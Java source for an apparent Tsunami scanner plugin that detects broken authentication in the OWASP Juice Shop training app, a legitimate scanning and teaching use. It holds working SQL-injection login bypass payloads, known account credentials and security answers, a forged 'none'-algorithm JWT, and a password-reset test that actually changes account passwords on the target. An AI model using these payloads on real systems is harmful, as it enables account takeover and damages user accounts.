/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.util.Timestamps;
import com.google.protobuf.ByteString;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.tsunami.common.net.http.HttpHeaders;

import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.Clock;
import java.util.regex.Pattern;
import java.util.regex.Matcher;
import java.util.Base64;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "BrokenauthenticationdetectorpluginDetector",
    version = "0.1",
    description = "Detects BrokenAuthenticationDetectorPlugin vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = BrokenauthenticationdetectorpluginDetectorBootstrapModule.class)
public final class BrokenauthenticationdetectorpluginDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public BrokenauthenticationdetectorpluginDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Brokenauthenticationdetectorplugin Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    int successfulAttacks = 0;
    
    try {
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Accept", "application/json")
            .addHeader("Content-Type", "application/json")
            .build();
        
        // Test 1: SQL Injection bypass with ' or 1=1--
        if (testSqlInjectionLogin(targetUri, headers, networkService, "' or 1=1--", "password")) {
            successfulAttacks++;
        }
        
        // Test 2: SQL Injection with admin email comment
        if (testSqlInjectionLogin(targetUri, headers, networkService, "admin@juice-sh.op'--", "password")) {
            successfulAttacks++;
        }
        
        // Test 3: Default admin credentials
        if (testCredentialLogin(targetUri, headers, networkService, "admin@juice-sh.op", "admin123")) {
            successfulAttacks++;
        }
        
        // Test 4: MC SafeSearch credentials
        if (testCredentialLogin(targetUri, headers, networkService, "mc.safesearch@juice-sh.op", "Mr. N00dles")) {
            successfulAttacks++;
        }
        
        // Test 5: Amy's padded password
        if (testCredentialLogin(targetUri, headers, networkService, "amy@juice-sh.op", "K1f.....................")) {
            successfulAttacks++;
        }
        
        // Test 6: Jim's Star Trek password
        if (testCredentialLogin(targetUri, headers, networkService, "jim@juice-sh.op", "ncc-1701")) {
            successfulAttacks++;
        }
        
        // Test 7: Bender's SQL injection
        if (testSqlInjectionLogin(targetUri, headers, networkService, "bender@juice-sh.op'--", "password")) {
            successfulAttacks++;
        }
        
        // Test 8: Chris's deleted account SQL injection
        if (testSqlInjectionLogin(targetUri, headers, networkService, "' or deletedAt IS NOT NULL--", "password")) {
            successfulAttacks++;
        }
        
        // Test 9: Bjoern's OAuth credentials
        if (testCredentialLogin(targetUri, headers, networkService, "bjoern.kimminich@googlemail.com", "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=")) {
            successfulAttacks++;
        }
        
        // Test 10: Support team credentials
        if (testCredentialLogin(targetUri, headers, networkService, "support@juice-sh.op", "J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P")) {
            successfulAttacks++;
        }
        
        // Test 11: Password reset vulnerability - John
        if (testPasswordReset(targetUri, headers, networkService, "john@juice-sh.op", "Daniel Boone National Forest")) {
            successfulAttacks++;
        }
        
        // Test 12: Password reset vulnerability - Emma
        if (testPasswordReset(targetUri, headers, networkService, "emma@juice-sh.op", "ITsec")) {
            successfulAttacks++;
        }
        
        // Test 13: Password reset vulnerability - Bender
        if (testPasswordReset(targetUri, headers, networkService, "bender@juice-sh.op", "Stop'n'Drop")) {
            successfulAttacks++;
        }
        
        // Test 14: Password reset vulnerability - Jim
        if (testPasswordReset(targetUri, headers, networkService, "jim@juice-sh.op", "Samuel")) {
            successfulAttacks++;
        }
        
        // Test 15: JWT token manipulation
        if (testJwtManipulation(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
    } catch (IOException e) {
        logger.atWarning().log(
            format("Broken authentication test failed on '%s': %s", networkService, e.getMessage()));
        return false;
    }
    
    return successfulAttacks > 0;
}

private boolean testSqlInjectionLogin(String targetUri, HttpHeaders headers, NetworkService networkService, String email, String password) throws IOException {
    String loginPayload = String.format("{\"email\":\"%s\",\"password\":\"%s\"}", email, password);
    
    HttpResponse response = httpClient.send(
        HttpRequest.post(targetUri + "/rest/user/login")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(loginPayload))
            .build(),
        networkService);
    
    if (response.status().code() == 200) {
        String responseBody = response.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        
        // Check for authentication token in response
        return responseBody.contains("token") || responseBody.contains("authentication");
    }
    
    return false;
}

private boolean testCredentialLogin(String targetUri, HttpHeaders headers, NetworkService networkService, String email, String password) throws IOException {
    String loginPayload = String.format("{\"email\":\"%s\",\"password\":\"%s\"}", email, password);
    
    HttpResponse response = httpClient.send(
        HttpRequest.post(targetUri + "/rest/user/login")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(loginPayload))
            .build(),
        networkService);
    
    if (response.status().code() == 200) {
        String responseBody = response.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        
        // Check for successful authentication indicators
        return responseBody.contains("token") && !responseBody.contains("Invalid");
    }
    
    return false;
}

private boolean testPasswordReset(String targetUri, HttpHeaders headers, NetworkService networkService, String email, String answer) throws IOException {
    // First, initiate password reset
    String resetPayload = String.format("{\"email\":\"%s\"}", email);
    
    HttpResponse resetResponse = httpClient.send(
        HttpRequest.post(targetUri + "/rest/user/reset-password")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(resetPayload))
            .build(),
        networkService);
    
    if (resetResponse.status().code() == 200) {
        // Try to answer security question
        String answerPayload = String.format("{\"email\":\"%s\",\"answer\":\"%s\",\"new\":\"newpassword123\",\"repeat\":\"newpassword123\"}", email, answer);
        
        HttpResponse answerResponse = httpClient.send(
            HttpRequest.post(targetUri + "/rest/user/reset-password")
                .setHeaders(headers)
                .setRequestBody(ByteString.copyFromUtf8(answerPayload))
                .build(),
            networkService);
        
        return answerResponse.status().code() == 200;
    }
    
    return false;
}

private boolean testJwtManipulation(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    // First login to get a valid JWT
    String loginPayload = "{\"email\":\"test@test.com\",\"password\":\"test\"}";
    
    HttpResponse loginResponse = httpClient.send(
        HttpRequest.post(targetUri + "/rest/user/login")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(loginPayload))
            .build(),
        networkService);
    
    if (loginResponse.status().code() == 200) {
        String responseBody = loginResponse.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        
        // Extract JWT token from response
        Pattern tokenPattern = Pattern.compile("\"token\":\"([^\"]+)\"");
        Matcher matcher = tokenPattern.matcher(responseBody);
        
        if (matcher.find()) {
            String originalToken = matcher.group(1);
            
            // Create manipulated JWT with 'none' algorithm
            String manipulatedToken = createManipulatedJwt(originalToken);
            
            if (manipulatedToken != null) {
                // Test the manipulated token
                HttpHeaders jwtHeaders = HttpHeaders.builder()
                    .addHeader("Accept", "application/json")
                    .addHeader("Authorization", "Bearer " + manipulatedToken)
                    .build();
                
                HttpResponse testResponse = httpClient.send(
                    HttpRequest.get(targetUri + "/api/Users")
                        .setHeaders(jwtHeaders)
                        .build(),
                    networkService);
                
                return testResponse.status().code() == 200;
            }
        }
    }
    
    return false;
}

private String createManipulatedJwt(String originalToken) {
    try {
        String[] parts = originalToken.split("\\.");
        if (parts.length != 3) return null;
        
        // Create simple JWT with 'none' algorithm
        String newHeader = "{\"alg\":\"none\",\"typ\":\"JWT\"}";
        String newPayload = "{\"email\":\"jwtn3d@juice-sh.op\",\"iat\":1234567890}";
        
        // Encode to base64
        String encodedHeader = Base64.getUrlEncoder().withoutPadding().encodeToString(newHeader.getBytes());
        String encodedPayload = Base64.getUrlEncoder().withoutPadding().encodeToString(newPayload.getBytes());
        
        return encodedHeader + "." + encodedPayload + ".";
        
    } catch (IllegalArgumentException e) {
        return null;
    }
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("BROKENAUTHENTICATIONDETECTORPLUGIN_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("BrokenAuthenticationDetectorPlugin Vulnerability Exposed")
                .setDescription("The application is vulnerable to BrokenAuthenticationDetectorPlugin attacks.")
                .setRecommendation(
                    "Implement proper input validation, use parameterized queries, enforce strong password policies, implement proper JWT validation, and use secure authentication mechanisms"))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("BROKENAUTHENTICATIONDETECTORPLUGIN_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("BrokenAuthenticationDetectorPlugin Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to BrokenAuthenticationDetectorPlugin attacks.")
            .setRecommendation(
                "Implement proper input validation, use parameterized queries, enforce strong password policies, implement proper JWT validation, and use secure authentication mechanisms")
        .build());
  }
}